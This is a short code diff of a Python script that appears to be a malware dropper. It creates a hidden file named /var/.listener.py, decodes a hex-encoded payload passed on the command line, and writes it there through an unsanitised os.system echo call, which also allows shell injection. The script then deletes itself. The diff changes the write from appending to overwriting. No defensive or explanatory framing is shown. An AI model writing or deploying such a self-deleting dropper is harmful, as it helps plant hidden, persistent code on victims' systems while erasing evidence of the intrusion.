@@ -31,7 +31,7 @@ import os
 def main():
 	os.system('touch /var/.listener.py')
 	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
-	os.system('echo ' + package + ' >> /var/.listener.py')
+	os.system('echo ' + package + ' > /var/.listener.py')
 	self = sys.argv[0]
 	os.system(f"rm {self}")
 main()
